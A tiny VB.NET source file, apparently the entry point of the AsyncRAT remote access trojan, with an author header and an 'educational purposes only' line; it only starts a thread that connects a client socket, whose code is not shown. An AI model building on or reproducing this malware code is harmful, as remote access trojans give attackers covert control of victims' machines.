Public Class Main

    '       │ Author     : NYAN CAT
    '       │ Name       : AsyncRAT

    '       Contact Me   : https://github.com/NYAN-x-CAT

    '       This program Is distributed for educational purposes only.

    Public Shared Sub Main()
        Dim T As New Threading.Thread(AddressOf ClientSocket.Connect)
        T.Start()
    End Sub

End Class
